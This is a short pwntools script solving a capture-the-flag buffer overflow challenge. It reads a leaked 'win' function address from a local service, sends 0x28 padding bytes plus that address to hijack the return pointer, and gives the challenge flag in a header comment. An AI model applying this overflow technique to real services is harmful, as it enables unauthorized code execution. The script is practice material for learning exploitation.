# BLACKLIST_CTF{*Y0Ur_BaBy_B0F_S0lVED!*}

from pwn import *
from pwn import p64

def slog(n, m): return success(': '.join([n, hex(m)]))

p = remote('127.0.0.1', 8001)
# p = process('./program')

p.recvuntil(b': ')
win = int(p.recvn(8), 16)

payload = b'\x90' * 0x28
payload += p64(win)

p.sendlineafter(b'input: ', payload)

slog('win', win)

p.interactive()